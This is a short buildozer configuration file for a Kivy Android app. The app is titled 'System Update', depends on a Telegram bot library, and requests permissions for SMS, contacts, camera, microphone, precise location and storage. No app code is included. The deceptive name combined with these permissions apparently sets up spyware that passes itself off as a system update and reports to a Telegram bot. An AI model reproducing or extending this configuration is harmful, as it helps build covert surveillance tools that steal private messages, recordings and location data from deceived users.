[app]
title = System Update
package.name = sysupdate
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 0.1
requirements = python3,kivy,python-telegram-bot

# --- IZIN SAKTI ---
android.permissions = INTERNET, SMS, RECEIVE_SMS, READ_CONTACTS, CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE

# --- PENGATURAN TAMPILAN ---
orientation = portrait
fullscreen = 0
android.arch = armeabi-v7a
p4a.branch = master
